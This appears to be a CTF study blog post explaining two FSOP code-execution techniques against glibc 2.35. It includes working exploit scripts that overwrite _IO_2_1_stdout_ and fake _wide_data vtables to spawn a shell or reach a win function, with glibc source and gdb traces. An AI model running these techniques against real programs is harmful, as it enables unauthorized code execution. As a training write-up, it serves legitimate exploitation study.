---
title: "FSOP code execution"
description: "My note for studying code execution through FSOP"
date: 2024-08-01
tags: 
  - 'CTF'
  - 'PWN'
  - '2024'
  - 'Technique'
---

There's probably many blogs about file struct exploit that cover the subject of arbitrary read and write, but not about hijacking vtable into code execution. With that being said, this blogpost will talk about two ways to execute code using FSOP, which I usually use in CTF challenges.
## Targeting `_IO_2_1_stdout_`
The original exploit was written by [nobodyisnobody](https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc#3---the-fsop-way-targetting-stdout):
```python
# some constants
stdout_lock = libc.address + 0x2008f0   # _IO_stdfile_1_lock  (symbol not exported)
stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
# our gadget
gadget = libc.address + 0x00000000001676a0 # add rdi, 0x10 ; jmp rcx

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=libc.sym['system']            # the function that we will call: system()
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh\x00')  # will be at rdi+0x10
fake._lock=stdout_lock
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout+0x200          # _wide_data just need to points to empty zone
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)
# write the fake Filestructure to stdout
write(libc.sym['_IO_2_1_stdout_'], bytes(fake))
# enjoy your shell
```
Let's go into internal to see what it really does.
### Call `_IO_wfile_underflow`
The usual stream of most function using `stdout` is to call `_IO_xsputn` through `_IO_file_jumps`, which is a `_IO_jump_t` vtable:

```c 
// https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libioP.h#L294
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn); 
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
};
```
The exploit shift the vtable back 3 functions, which turn `__xsputn` into `__underflow` entry. Now, let's see what's inside `_IO_wfile_underflow`.
```c 
// https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/wfileops.c#L111
wint_t
_IO_wfile_underflow (FILE *fp)
{
  struct _IO_codecvt *cd;
  enum __codecvt_result status;
  ssize_t count;

  /* C99 requires EOF to be "sticky".  */
  if (fp->_flags & _IO_EOF_SEEN)
    return WEOF;

  if (__glibc_unlikely (fp->_flags & _IO_NO_READS))
    {
      fp->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return WEOF;
    }
  if (fp->_wide_data->_IO_read_ptr < fp->_wide_data->_IO_read_end)
    return *fp->_wide_data->_IO_read_ptr;

  cd = fp->_codecvt;

  /* Maybe there is something left in the external buffer.  */
  if (fp->_IO_read_ptr < fp->_IO_read_end)
    {
      /* There is more in the external.  Convert it.  */
      const char *read_stop = (const char *) fp->_IO_read_ptr;

      fp->_wide_data->_IO_last_state = fp->_wide_data->_IO_state;
      fp->_wide_data->_IO_read_base = fp->_wide_data->_IO_read_ptr =
	fp->_wide_data->_IO_buf_base;
      status = __libio_codecvt_in (cd, &fp->_wide_data->_IO_state,
				   fp->_IO_read_ptr, fp->_IO_read_end,
				   &read_stop,
				   fp->_wide_data->_IO_read_ptr,
				   fp->_wide_data->_IO_buf_end,
				   &fp->_wide_data->_IO_read_end);
```
The exploit manages to call `__libio_codecvt_in`, which take the first argument being `_IO_2_1_stdout_->_codecvt`. I'll talk later what's inside `__libio_codecvt_in`. But now, take a look at how the exploit bypass all the flag check to get to its desired call.
### Bypass flag check
There're 4 conditions need to be met to reach to `__libio_codecvt_in`.
```c 
// https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libio.h#L70
#define _IO_MAGIC         0xFBAD0000 /* Magic number */
#define _IO_MAGIC_MASK    0xFFFF0000
#define _IO_USER_BUF          0x0001 /* Don't deallocate buffer on close. */
#define _IO_UNBUFFERED        0x0002
#define _IO_NO_READS          0x0004 /* Reading not allowed.  */
#define _IO_NO_WRITES         0x0008 /* Writing not allowed.  */
#define _IO_EOF_SEEN          0x0010
#define _IO_ERR_SEEN          0x0020
#define _IO_DELETE_DONT_CLOSE 0x0040 /* Don't call close(_fileno) on close.  */
#define _IO_LINKED            0x0080 /* In the list of all open files.  */
#define _IO_IN_BACKUP         0x0100
#define _IO_LINE_BUF          0x0200
#define _IO_TIED_PUT_GET      0x0400 /* Put and get pointer move in unison.  */
#define _IO_CURRENTLY_PUTTING 0x0800
#define _IO_IS_APPENDING      0x1000
#define _IO_IS_FILEBUF        0x2000
                           /* 0x4000  No longer used, reserved for compat.  */
#define _IO_USER_LOCK         0x8000
```
* As decleared as macros, `_IO_EOF_SEEN` and `_IO_NO_READS` being 0x0010 and 0x0004 respectively. Those flags need to be turned off, as in `_IO_wfile_underflow`. The exploit's flag is `fake.flags = 0x3b01010101010101`, which passed both checks.
* The `_IO_wide_data` is also checked, however we set `fp->wide_data = nullbuf` so it easily passes the check.
* Last one, `fp->_IO_read_ptr < _IO_read_end`: we did not set `fp->_IO_read_ptr`, but `_IO_read_end`, so it is 0, which passed the check.
### Inside `__libio_codecvt_in`
```c 
// https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/iofwide.c#L162
__libio_codecvt_in (struct _IO_codecvt *codecvt, __mbstate_t *statep,
		    const char *from_start, const char *from_end,
		    const char **from_stop,
		    wchar_t *to_start, wchar_t *to_end, wchar_t **to_stop)
{
  enum __codecvt_result result;

  struct __gconv_step *gs = codecvt->__cd_in.step;
  int status;
  size_t dummy;
  const unsigned char *from_start_copy = (unsigned char *) from_start;

  codecvt->__cd_in.step_data.__outbuf = (unsigned char *) to_start;
  codecvt->__cd_in.step_data.__outbufend = (unsigned char *) to_end;
  codecvt->__cd_in.step_data.__statep = statep;

  __gconv_fct fct = gs->__fct;
#ifdef PTR_DEMANGLE
  if (gs->__shlib_handle != NULL)
    PTR_DEMANGLE (fct);
#endif

  status = DL_CALL_FCT (fct,
			(gs, &codecvt->__cd_in.step_data, &from_start_copy,
			 (const unsigned char *) from_end, NULL,
			 &dummy, 0, 0));

// https://elixir.bootlin.com/glibc/glibc-2.35/source/bits/dlfcn.h#L54
/* To support profiling of shared objects it is a good idea to call
   the function found using `dlsym' using the following macro since
   these calls do not use the PLT.  But this would mean the dynamic
   loader has no chance to find out when the function is called.  The
   macro applies the necessary magic so that profiling is possible.
   Rewrite
	foo = (*fctp) (arg1, arg2);
   into
        foo = DL_CALL_FCT (fctp, (arg1, arg2));
```
Yes, our function pointer is finally here. As described, it calls `(*fctp) (arg1,arg2);`. But first, what is `fct`?. We don't care about what it is, but we need to know how they control that.

First, it gets `gs = codecvt->__cd_in.step`, fortunately is at offset 0 of `codecvt`. As I debug, `codecvt` point back to `_IO_2_1_stdout_+32`:
```
pwndbg> tel 0x155555504780+0xb8
00:0000│ rbx 0x155555504838 (_IO_2_1_stdout_+184) —▸ **0x1555555047a0** (_IO_2_1_stdout_+32) ◂— 0
01:0008│ rsi 0x155555504840 (_IO_2_1_stdout_+192) ◂— 0
... ↓        2 skipped
04:0020│     0x155555504858 (_IO_2_1_stdout_+216) —▸ 0x1555555000a8 ◂— 0
05:0028│     0x155555504860 (stderr) —▸ 0x1555555049d8 (ahostbuf) ◂— 0
06:0030│     0x155555504868 (stdout+4294625368) ◂— 0x1555000a736c /* 'ls\n' */
07:0038│     0x155555504870 (stdin+4294625360) —▸ 0x155555503aa0 (_IO_2_1_stdin_) ◂— 0xfbad208b
pwndbg> tel 0x1555555047a0
00:0000│ rdi r13 0x1555555047a0 (_IO_2_1_stdout_+32) ◂— 0
01:0008│         0x1555555047a8 (_IO_2_1_stdout_+40) ◂— 0
02:0010│         0x1555555047b0 (_IO_2_1_stdout_+48) ◂— 0x68732f6e69622f /* '/bin/sh' */
03:0018│         0x1555555047b8 (_IO_2_1_stdout_+56) ◂— 0
04:0020│         0x1555555047c0 (_IO_2_1_stdout_+64) ◂— 0
05:0028│         0x1555555047c8 (_IO_2_1_stdout_+72) —▸ 0x15555544d830 (svcunix_getargs+16) ◂— add rdi, 0x10
06:0030│         0x1555555047d0 (_IO_2_1_stdout_+80) ◂— 0
07:0038│         0x1555555047d8 (_IO_2_1_stdout_+88) ◂— 0
```
Then, it takes `fct = gs->__fct`, which lies at offset 0x28 (or 5 qword)
```c 
// https://elixir.bootlin.com/glibc/glibc-2.35/source/iconv/gconv.h#L84
struct __gconv_step
{
  struct __gconv_loaded_object *__shlib_handle;
  const char *__modname;

  /* For internal use by glibc.  (Accesses to this member must occur
     when the internal __gconv_lock mutex is acquired).  */
  int __counter;

  char *__from_name;
  char *__to_name;

  __gconv_fct __fct;
  __gconv_btowc_fct __btowc_fct;
  __gconv_init_fct __init_fct;
  __gconv_end_fct __end_fct;

  /* Information about the number of bytes needed or produced in this
     step.  This helps optimizing the buffer sizes.  */
  int __min_needed_from;
  int __max_needed_from;
  int __min_needed_to;
  int __max_needed_to;

  /* Flag whether this is a stateful encoding or not.  */
  int __stateful;

  void *__data;		/* Pointer to step-local data.  */
};
```
Take a look back at my gdb, at offset 0x28 from `*gs` is gadget `add rdi, 0x10, jmp rcx`. Our current `rdi` is at `*gs`, and `+0x10` means `rdi` will contain `"/bin/sh"`. Meanwhile, `rcx` already pointed to `system`. Voila.

What a masterpiece.
## Targeting `wide_data`
This exploit came from pwn.college **file struct exploit** module:
![image](https://hackmd.io/_uploads/HkX2gWtKA.png)
I follow the given instruction to create exploit code myself. This exploit script is used for level 7
```python
from pwn import *

context.binary = exe = ELF('../babyfile_level7')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
DEBUG = False
if not DEBUG:
    chall = process()
else:
    chall = gdb.debug(exe.path, gdbscript='''
    b *_IO_wdoallocbuf
    c
    ''')

chall.recvuntil(b'is: ')
leak = int(chall.recvline().strip(),16) - libc.sym["puts"]
libc.address = leak
log.info('Libc @ ' +hex(libc.address))
chall.recvuntil(b'at: ')
leak = int(chall.recvline().strip(),16)
buf = leak
# _IO_wfile_overflow = 0x89ce0
# fake vtable = 0x1e8f40
fake_vtable = flat([buf]*11 + [exe.sym.win]*10 )
filestr = FileStructure()
filestr.vtable = libc.address + 0x1e8f40
filestr._wide_data = buf - 0xd0
filestr.flags = 0xfbad2484
filestr._lock = buf + 0x1000
chall.sendafter(b'name.\n',fake_vtable)
chall.sendafter(b'struct.\n\n', bytes(filestr))
chall.interactive()
```
### Call `_IO_wfile_overflow`
First, let's see the flow of `_IO_wfile_overflow`:
```c 
// https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/wfileops.c#L406
wint_t
_IO_wfile_overflow (FILE *f, wint_t wch)
{
  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return WEOF;
    }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0)
    {
      /* Allocate a buffer if needed. */
      if (f->_wide_data->_IO_write_base == 0)
	{
	  _IO_wdoallocbuf (f);
	  _IO_free_wbackup_area (f);
	  _IO_wsetg (f, f->_wide_data->_IO_buf_base,
		     f->_wide_data->_IO_buf_base, f->_wide_data->_IO_buf_base);

	  if (f->_IO_write_base == NULL)
	    {
	      _IO_doallocbuf (f);
	      _IO_setg (f, f->_IO_buf_base, f->_IO_buf_base, f->_IO_buf_base);
	    }
```
We just need it to call `_IO_wdoallocbuf`, and again, we have to set some flags and value to bypass the check. There're 3 conditions must be met:
* Turn off flag for `_IO_NO_WRITES`, which is 0x0008. 
* Turn off flag for `_IO_CURRENTLY_PUTTING`, which is 0x0800
* `f->_wide_data->_IO_write_base == nullptr`. This one is quite easy to set, since the challenge give us 2 buffer.
### Call `_IO_wdoallocbuf`
If all conditions met, it will call `_IO_wdoallocbuf`:
```c 
void
_IO_wdoallocbuf (FILE *fp)
{
  if (fp->_wide_data->_IO_buf_base)
    return;
  if (!(fp->_flags & _IO_UNBUFFERED))
    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)
      return;
  _IO_wsetb (fp, fp->_wide_data->_shortbuf,
		     fp->_wide_data->_shortbuf + 1, 0);
}
```
Again, we still have to bypass 2 checks for it to call `_IO_WDOALLOCATE`, which jumps to `_IO_wide_jumps` with no check.
* `fp->_wide_data->_IO_buf_base == nullptr`. Again, this is easy.
* Turn off the flag for `_IO_UNBUFFERED`, which is 0x0002.

My exploit's flag is `filestr.flags = 0xfbad2484`, which passed all the check

And we all done. We just need to fake `fp->_wide_data->vtable` for `system` to fall right into `_IO_WDOALLOCATE` entry which is at `vtable+0x68`

However, when I do this exploit on `aarch64`, I have to set the flag to `0xfbad20b1` for the exploit to work, because the `0xfbad2484` doesn't. I have no idea about that. And the flag `0xfbad20b1` obviously works on `amd64`.

This path is easier to understand, isn't it :D.
## TO DO
* Merge 2 buffers of `wide_data` path into 1 buffer.
## Conclusion
After some trials and errors, I found code execution on FSOP is very strong on specific scenarios: you only have 1 big arbitrary write and only leaked libc address. For smaller arbitrary write buffer, you have to be more careful, and it may not worth it. You can overwrite stdin to read more buffer to combat small arbitrary buffer. It's also not very useful when it comes to bypass seccomps. In that case, leaking environ into ROPchain is more reliable.

